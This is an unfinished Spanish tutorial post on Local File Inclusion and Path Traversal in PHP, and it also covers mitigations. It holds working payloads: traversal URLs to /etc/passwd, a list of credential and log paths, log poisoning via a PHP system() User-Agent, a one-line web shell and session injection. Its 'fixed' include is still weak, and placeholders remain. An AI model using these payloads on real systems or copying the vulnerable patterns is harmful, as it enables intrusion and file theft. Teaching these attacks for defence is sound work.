---
title: ""
summary: ""
date: 2025-04-06
tags:
  - Seguridad Web
  - Path Traversal
  - Local File Inclusion
lang: es
---

# Title

<!-- more -->

# ¿Qué es Local File Inclusion (LFI)?

La vulnerabilidad de **Local File Inclusion** ocurre cuando el servidor incluye archivos locales basándose en entradas proporcionadas por el usuario. Esto puede llevar a la ejecución de código malicioso o la exposición de información confidencial.

## Impacto de las LFI

Las vulnerabilidades de LFI pueden causar graves problemas de seguridad en un servidor web, entre ellos:

- **Acceso no autorizado a archivos sensibles**: Permite a un atacante leer archivos de configuración y credenciales almacenadas en el sistema.
- **Ejecución de código malicioso**: Si el atacante puede incluir archivos con contenido PHP, podría ejecutar código arbitrario en el servidor.
- **Escalada de privilegios**: Un atacante podría combinar LFI con otras vulnerabilidades para obtener acceso privilegiado en el sistema.
- **Robo de información**: Exponer archivos con datos de usuarios o configuraciones del sistema puede comprometer la seguridad de la aplicación.
- **Defacement y ataques persistentes**: Si el atacante consigue modificar archivos del sistema, podría inyectar contenido malicioso en la página web o mantener un acceso persistente al servidor.

### LFI Básico

Como hemos comentado en la introducción, este tipo de vulnerabilidades se aprovechan de que el input del usuario no está sanitizado correctamente y, por ende, el atacante puede realizar una serie de modificaciones que pueden alterar el funcionamiento de la aplicación web.

Imaginemos que estamos ante una aplicación web desarrollada en _PHP_:

<figure markdown="span">
    ![LFI básico](../../assets/posts/2025/04/06/LFIWP.png)
  <figcaption>Aplicación Web.</figcaption>
</figure>

Vemos que tenemos una barra de búsqueda donde podemos buscar cualquier archivo. Es decir, la aplicación web estaría haciendo uso de un código similar a este:

```php
<?php
  $file = $_GET['file'];
  if (isset($file)) {
      include($file);
  }
?>
```

Este sencillo código espera un parámetro `file` que contendrá el archivo que le pasamos al formulario de búsqueda de la página web. Por tanto, si ponemos en el formulario un archivo como `hi.php`, la variable contendrá dicha cadena que hará referencia al fichero `hi.php` contenido en el mismo directorio que el archivo de la aplicación web.

Si realizamos dicha búsqueda, la URL de nuestra web cambiará a la siguiente:

```url
http://dominio.com/pruebas/index.php?archivo=hi.php
```
<figure markdown="span">
    ![Resultado de aplicar LFI básico](../../assets/posts/2025/04/06/BasicLFI.png)
  <figcaption>Resultado de aplicar LFI básico.</figcaption>
</figure>


Vamos a ir un paso más allá e intentar acceder al archivo que contiene la configuración de los usuarios en los sistemas Linux, si el fichero `/etc/passwd`. Como el input del parámetro `file` no está sanitizado, el atacante podría escribir lo siguiente en la URL de la aplicación web:

```url
http://dominio.com/pruebas/index.php?archivo=/etc/passwd
```

<figure markdown="span">
    ![Accesso al fichero /etc/passwd](../../assets/posts/2025/04/06/BasicLFI2.png)
  <figcaption>Acceso al fichero /etc/passwd.</figcaption>
</figure>


Esto es un error enorme de seguridad, ya que el atacante podría obtener información privilegiada sobre los usuarios que existen en el sistema o tener acceso a otros recursos como:

**Archivos de configuración y credenciales**:

  - `/etc/passwd` → Lista de usuarios del sistema (Linux).
  - `/etc/shadow` → Contraseñas encriptadas (requiere privilegios).
  - `/etc/hosts` → Configuración de nombres de dominio locales.
  - `/etc/mysql/my.cnf` → Configuración de MySQL (puede contener credenciales).

**Archivos de logs (pueden contener información sensible o shell injection)**:

  - `/var/log/apache2/access.log` o `error.log` → Logs de Apache.
  - `/var/log/nginx/access.log` → Logs de Nginx.
  - `/var/log/auth.log` o `/var/log/secure` → Registros de autenticación.

Ante esto, podríamos realizar una sanitización del input que recibe el parámetro `file`:

```php
<?php
  $file = $_GET['file'];
  if (isset($file)) {
      include("/var/www/html" . $file);
  }
?>
```

<figure markdown="span">
    ![Acceso al fichero /etc/passwd restringido](../../assets/posts/2025/04/06/BasicLFIFix.png)
  <figcaption>Acceso al fichero /etc/passwd restringido.</figcaption>
</figure>


Finalmente, vemos que el acceso a los ficheros que no están contenidos en la ruta `/var/www/html` está restringido, aumentando la seguridad en nuestro servidor de cara al acceso de archivos por parte de agentes externos.

### LFI con Path Traversal

Ahora, estamos ante una aplicación web más robusta, es decir, que el **LFI básico** no funcionará, ya que la web contiene este código:

```php
<?php
  $file = $_GET['file'];
  if (isset($file)) {
      include("/var/www/html". $file);
  }
?>
```

Esta protección nos priva de acceder a cualquier archivo contenido en el servidor (siempre y cuando los permisos del mismo nos permitan acceder a él). Sin embargo, esta protección puede ser eludida haciendo uso de una técnica llamada **Path Traversal**, pero ¿qué es el Path Traversal?

El **Path Traversal**, también conocido como **Directory Traversal**, es una técnica utilizada para acceder a archivos y directorios fuera del directorio permitido por la aplicación web. Esto se logra utilizando secuencias como `../` para moverse a niveles superiores del sistema de archivos.

Si una aplicación tiene un filtro parcial que solo restringe archivos en su directorio de trabajo, se puede usar Path Traversal junto con LFI para acceder a archivos del sistema. Por ejemplo:

```url
https://dominio.com/pruebas/index.php?file=../../../../../../../../../../../etc/passwd
```
<figure markdown="span">
    ![Acceso al fichero /etc/passwd del servidor](../../assets/posts/2025/04/06/PTLFI.png)
  <figcaption>Acceso al archivo /etc/passwd del servidor.</figcaption>
</figure>

Este tipo de ataque es particularmente peligroso cuando se combina con LFI, ya que puede permitir a un atacante acceder a archivos críticos del sistema, incluyendo configuraciones, credenciales y registros de actividad del servidor. Además, una práctica común es escalar este tipo de ataques a una ejecución remota de comandos, ya sea realizando un ataque de `LogPoisoning` o incluyendo una `Web Shell` en el servidor.

Vamos a ver más a fondo como podemos escalar de un **Local File Inclusion** a una **Ejecución Remota de Comandos**

### De LFI a RCE (Remote Code Execution)

La transición de una vulnerabilidad de **Local File Inclusion (LFI)** a una **Remote Code Execution (RCE)** es una técnica avanzada que los atacantes pueden emplear para comprometer completamente un sistema. A continuación, se explican los métodos más comunes para lograr esta escalada:

#### Inclusión de archivos de registro con inyección de código
Si el servidor web registra las solicitudes en archivos de log accesibles, un atacante puede inyectar código malicioso en dichos registros y luego incluirlos mediante LFI. Por ejemplo:

1. El atacante envía una solicitud maliciosa que inyecta código PHP en los logs del servidor:
  ```bash
  curl -A "<?php system('whoami'); ?>" http://dominio.com
  ```
  Aquí, el código PHP se inyecta en el archivo de logs del servidor web (por ejemplo, `/var/log/apache2/access.log`).

2. Luego, utiliza LFI para incluir el archivo de log:
  ```url
  http://dominio.com/pruebas/index.php?file=../../../../../../var/log/apache2/access.log
  ```
  Esto ejecutará el código PHP inyectado, permitiendo al atacante ejecutar comandos en el servidor.

 # PONER FOTO LOG APACHE

<!-- <figure markdown="span">
    ![Acceso al contenido del log del servidor](../../assets/posts/2025/04/06/LFItoRCE1.png)
  <figcaption>Acceso al contenido del log del servidor.</figcaption>
</figure> -->

Como podemos observar al final del log, se refleja que hemos accedido al directorio especificado. Esto significa que el contenido de la variable proporcionada en la URL ha sido procesado por el servidor, permitiendo al atacante visualizar información sensible o ejecutar código malicioso si el archivo incluido contiene instrucciones ejecutables.
<!-- 
#### Inclusión de archivos cargados por el atacante
Si la aplicación permite la carga de archivos, un atacante puede subir un archivo malicioso (por ejemplo, un _web shell_ en PHP) y luego incluirlo mediante LFI:

1. El atacante sube un archivo llamado `shell.php` con el siguiente contenido:
  ```php
  <?php system($_GET['cmd']); ?>
  ```
  Esto hace que al recibir el input del parámetro `cmd` se ejecute la instrucción a nivel de sistema gracias a la función `system()` que nos proporciona *PHP*.

2. Luego, utiliza LFI para incluir el archivo cargado:
  ```url
  http://dominio.com/pruebas/index.php?file=../../<directorio>/shell.php&cmd=whoami
  ```
  Esto ejecutará el comando `whoami` en el servidor.

  # PONER FOTO EJECUCION COMANDO

#### Inclusión de sesiones PHP
Si el servidor utiliza sesiones PHP y almacena los datos de sesión en archivos accesibles, un atacante puede manipular su sesión para inyectar código PHP:

1. El atacante inicia una sesión y modifica su contenido:
  ```php
  <?php
  session_start();
  $_SESSION['malicioso'] = "<?php system('id'); ?>";
  ?>
  ```

2. Luego, utiliza LFI para incluir el archivo de sesión:
  ```url
  http://dominio.com/pruebas/index.php?file=/path/to/sessions/sess_<session_id>
  ```
  Esto ejecutará el código PHP inyectado en la sesión.

#### Inclusión de archivos temporales
En algunos casos, los archivos temporales generados por la aplicación pueden ser manipulados para incluir código malicioso. Por ejemplo, si la aplicación guarda datos de usuario en archivos temporales, un atacante podría inyectar código PHP en dichos datos y luego incluirlos mediante LFI.

### Mitigaciones para prevenir LFI a RCE
Para evitar que una vulnerabilidad de LFI escale a RCE, se deben implementar las siguientes medidas:

1. **Validación estricta de entradas**:
  - Utilizar listas blancas para limitar los archivos que pueden ser incluidos.
  - Rechazar caracteres como `../`, `%00`, y otros que permitan Path Traversal.

2. **Deshabilitar funciones peligrosas**:
  - Configurar `allow_url_include=Off` y `allow_url_fopen=Off` en `php.ini`.
  - Deshabilitar funciones como `system()`, `exec()`, `shell_exec()`, y similares.

3. **Aislar archivos sensibles**:
  - Almacenar archivos de configuración, logs y sesiones fuera del directorio accesible por la aplicación web.

4. **Configurar permisos adecuados**:
  - Restringir los permisos de lectura y escritura en archivos y directorios críticos.

5. **Monitorear y auditar**:
  - Revisar regularmente los logs del servidor para detectar actividades sospechosas.
  - Implementar herramientas de detección de intrusos (IDS) para identificar intentos de explotación.

El paso de LFI a RCE es una de las técnicas más peligrosas en el arsenal de un atacante, pero con las medidas adecuadas, se puede mitigar eficazmente este riesgo.


**Ejemplo de ataque con ejecución de código:**
Si un atacante puede cargar un archivo PHP en un directorio accesible, podría ejecutarlo mediante LFI:

```url
http://dominio.com/pruebas/index.php?file=../../uploads/shell.php
```

Esto permite ejecutar comandos en el servidor, escalando el ataque desde la simple lectura de archivos a la ejecución de código arbitrario, lo que podría comprometer completamente el sistema.

Para prevenir este ataque, se recomienda:
- **Validar y sanitizar la entrada del usuario**, evitando caracteres como `../`.
- **Restringir el acceso a archivos sensibles** mediante listas blancas de archivos permitidos.
- **Deshabilitar la ejecución de archivos remotos** con `allow_url_include=Off` en la configuración de PHP.
- **Configurar permisos adecuados** para evitar que el servidor lea archivos sensibles o ejecute código no autorizado.

El **LFI combinado con Path Traversal** es una vulnerabilidad grave que puede comprometer la seguridad de una aplicación si no se mitiga adecuadamente.

 -->
